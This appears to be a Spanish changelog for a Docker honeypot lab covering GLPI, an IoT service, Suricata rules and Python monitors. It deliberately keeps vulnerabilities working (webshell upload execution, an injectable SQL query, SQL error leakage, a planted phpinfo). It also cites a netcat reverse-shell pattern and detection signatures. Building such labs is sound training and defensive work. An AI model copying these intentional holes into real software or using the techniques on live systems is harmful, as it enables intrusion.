**Solución:** Nuevo `compose/webserver/entrypoint.sh` que espera a que MySQL acepte conexiones y ejecuta `php bin/console db:install --no-interaction --force` de forma idempotente (si ya está instalado, lo detecta y no hace nada) antes de arrancar Apache.

#### 2. La instalación de GLPI, si corre como root, rompe la web para siempre

**Problema:** `/var/www/html` es un bind mount al host (`../compose/webserver/glpi:/var/www/html`), así que el `chown -R www-data:www-data` del `Dockerfile` no tiene ningún efecto en tiempo de ejecución. Si `bin/console db:install` corre como root (como hacía inicialmente el entrypoint), genera caché de traducciones (`files/_cache/cache_trans/*.dat`) con permisos `600 root:root`. Apache, que sirve las páginas como `www-data`, no puede leer esos ficheros después: **cualquier página que dispare la carga de traducciones se corta a media renderización sin ningún error visible** (probado: `index.php` se quedaba en 50 bytes, justo tras `<html ...>`, con `Content-Length: 50` y sin ningún mensaje de error en ningún log, porque `log_errors` está en `Off`).

**Solución:** `db:install` ahora se ejecuta como `www-data` (`su -s /bin/sh www-data -c "..."`) dentro del entrypoint, más un `chown -R www-data:www-data files config` de seguridad al final por si algo se ha quedado con otro dueño.

#### 3. RCE vía subida de fichero no funcionaba: Apache ignoraba todos los `.htaccess`

**Problema:** La imagen base `php:7.3-apache` trae `AllowOverride None` en la configuración de Debian para `/var/www/`. Ningún `.htaccess` del proyecto se aplicaba nunca — ni el que activa la ejecución de `.php` en `/files/uploads/` (necesario para el RCE del walkthrough 4b), ni el que bloquea `/files/` en general. Una webshell subida se servía como texto plano, nunca se ejecutaba.

**Solución:** Se añadió un `conf-available` con `AllowOverride All` para `/var/www/html`, activado con `a2enconf`.

#### 4. `access.log` de Apache es un symlink a `/dev/stdout`: `monitor_webserver.py` moría al arrancar

**Problema:** La imagen base enlaza `access.log`/`error.log` a `/dev/stdout`/`/dev/stderr` (para que salgan por `docker logs`). Esos streams no son "seekable", así que `f.seek(0, 2)` en `tail_file()` lanzaba `io.UnsupportedOperation` y el hilo `monitor_apache_log()` moría en el arranque. **Ninguna alerta basada en el access log (SQLi, XSS, subida de fichero, ejecución de webshell, login, reconocimiento) ha estado funcionando nunca.**

**Solución:** El `Dockerfile` ahora elimina esos symlinks y crea ficheros reales antes de que Apache arranque.

#### 5. La inyección SQL "de libro" fallaba con un error de sintaxis

**Problema:** La query de `user_search.php` estaba escrita en varias líneas reales dentro del string PHP, y el parámetro se repite en tres cláusulas `OR ... LIKE`. Un comentario `-- ` de MySQL solo neutraliza el resto de **esa línea**, no las líneas siguientes, así que el payload UNION documentado dejaba colgando las cláusulas `OR realname LIKE...` / `OR firstname LIKE...` siguientes y MySQL devolvía `Unknown column 'realname' in 'field list'` en vez del resultado esperado.

**Solución:** La query se reescribió en una sola línea, para que el comentario `-- ` sí neutralice el resto de la sentencia.

#### 6. La inyección SQL, aun sin el bug anterior, petaba con un `Fatal error`

**Problema:** El código llamaba a `$DB->fetchAssoc($result)`, un método que no existe en la clase `DB` de esta versión de GLPI (el método real es `fetch_assoc`, en snake_case). Cualquier búsqueda que devolviera resultados —con o sin inyección— terminaba en `Fatal error: Call to undefined method DB::fetchAssoc()` con página en blanco.

**Solución:** `$DB->fetchAssoc($result)` → `$DB->fetch_assoc($result)`.

#### 7. `DEBUG_SQL` (fuga de errores SQL) nunca se activaba, y al activarla rompía la página

**Problema doble:** (a) GLPI solo incluye `config/config_db_slave.php` cuando activa una conexión de réplica, no en cada request, así que la constante `DEBUG_SQL` casi nunca llegaba a estar definida. (b) Al forzar su inclusión y volcar el error con un `echo` inmediato dentro de `DBmysql::query()`, cualquier página que consultase la BD *antes* de mandar las cabeceras HTTP (como `user_search.php`) rompía con `Cannot modify header information - headers already sent`, resultando en un 500 con cuerpo vacío.

**Solución:** `config_db_slave.php` se incluye directamente la primera vez que hace falta en `DBmysql::query()`, y el volcado del error se difiere con `register_shutdown_function()` para que nunca interfiera con cabeceras HTTP pendientes.

#### 8. El phpinfo() plantado dejó de ser accesible al arreglar el punto 3

**Problema:** Al activar `AllowOverride All` (punto 3), el `.htaccess` de `/files/` (que deniega todo el acceso) empezó a aplicarse por primera vez — y como `/files/PHP/01/` no tiene su propio `.htaccess`, heredaba ese deny. El phpinfo pre-plantado pasó de "siempre accesible" (por bug) a "403 Forbidden".

**Solución:** Nuevo `files/PHP/.htaccess` con `Require all granted`, igual que ya existía para `files/uploads/`.

#### 9. Suricata no veía nada del tráfico entre contenedores (bug de arquitectura)

**Problema:** En una bridge Docker estándar, una vez el switch aprende la MAC de cada contenedor, deja de reenviar tráfico unicast entre otros dos peers al puerto donde escucha Suricata (solo se ve tráfico durante la breve ventana de "flood" antes de que el switch aprenda las MACs). Con Suricata conectado a `honeypot_net` con su propia IP, quedaba prácticamente ciego ante cualquier ataque real, incluido todo el tráfico reenviado por el túnel SSH hacia GLPI e IoT — exactamente el tráfico que había que inspeccionar.

**Solución:** `suricata` ahora usa `network_mode: "service:gateway"` — comparte la pila de red del gateway en vez de tener la suya propia. Así ve directamente el SSH/SMB entrante y también las conexiones que `sshd` reenvía por el túnel `-L` hacia `glpi-web` e `iot-vuln`.

#### 10. `flags:S` + `flow:established` en la misma regla: contradicción que impide que dispare jamás

**Problema:** La regla original de escaneo SYN (sid 1000070, ya existía) y las nuevas de fuerza bruta SSH/SMB combinaban `flags:S` (paquete SYN puro, sin ACK) con `flow:to_server,established` — pero un flujo no se considera "established" hasta *después* del handshake, momento en el que ya no hay más paquetes con solo el flag SYN. La combinación hace que la regla no pueda disparar nunca. Confirmado con Suricata rechazando la regla al cargar (`pcre match failed`) para las variantes mal formadas, y con hydra no disparando ninguna alerta para las que sí cargaban.

**Solución:** Se quitó `flow:established` de las reglas que usan `flags:S`.

#### 11. `monitor_iot.py`: sin `CAP_SYS_PTRACE` no se puede leer el `/proc` de otro proceso, ni de root

**Problema:** Docker retira la capability `SYS_PTRACE` por defecto. Aunque `monitor_iot.py` corre como root dentro del contenedor, leer `/proc/<pid>/fd/*` de **otro** proceso requiere pasar un chequeo de ptrace que la ausencia de esa capability bloquea con "Permission denied" — incluso siendo root. La detección de reverse shell y de escalada de privilegios, que dependen de inspeccionar los fds de otros procesos, nunca disparaban.

**Además**, aun con la capability añadida, la detección de reverse shell seguía sin disparar: con `nc ... -e /bin/sh`, netcat hace fork+exec, y el proceso que termina sosteniendo el socket (el `/bin/sh` final) tiene un cmdline que es solo `"sh"`, sin ningún patrón sospechoso — el `nc` solo aparece en el cmdline del proceso *padre*. La función miraba solo el propio proceso, nunca sus ancestros.

**Solución:** Se añadió `cap_add: [SYS_PTRACE]` al servicio `iot` en `docker-compose.yaml`, y `detect_reverse_shells_by_process()` ahora recorre también la cadena de ancestros de cada proceso con un socket ESTABLISHED (igual que ya hacía `detect_find_escalation()` para la escalada de privilegios).

---

### Nuevas capacidades de detección

- **`monitor_webserver.py`**: nueva alerta 🕸️ de XSS (patrón `<script`/`onerror=`/`onload=`/`javascript:` en la URI o en título/contenido de un ticket) y alerta 🕵️ de acceso a rutas de reconocimiento (`info.php`, `files/PHP/`, `status.php`).
- **`compose/iot/app.js` + `monitor_iot.py`**: nuevo log `/var/log/iot/access.log` con cada `POST /set`, y una alerta 🎯 inmediata si el valor no es un número simple (es decir, cualquier intento de inyección de comandos), independientemente de si la reverse shell llega a establecerse o no.
- **`suricata.rules`**: 13 reglas nuevas — fuerza bruta SSH/SMB/GLPI-login/IoT-set, escaneos sigilosos de Nmap (NULL/FIN/XMAS), fingerprint por User-Agent de sqlmap/Nmap NSE/Nikto/Gobuster, y SQLi ciega basada en tiempo.
- **`telegram_alerts.py`**: las firmas de alta severidad (fuerza bruta, sqlmap, nmap, nikto, gobuster) mandan alerta 🚨 al instante, con deduplicación de 30 s por firma+origen, sin esperar al umbral de agregación de 5 alertas/10 s (que se mantiene para el resto de ruido).
- **`PYTHONUNBUFFERED`**: los cuatro monitores (`gateway`, `webserver`, `iot`, `suricata`) ahora arrancan con `python -u`, así que sus mensajes aparecen en `docker logs` en tiempo real en vez de quedarse en el buffer de stdout hasta que el proceso termina.
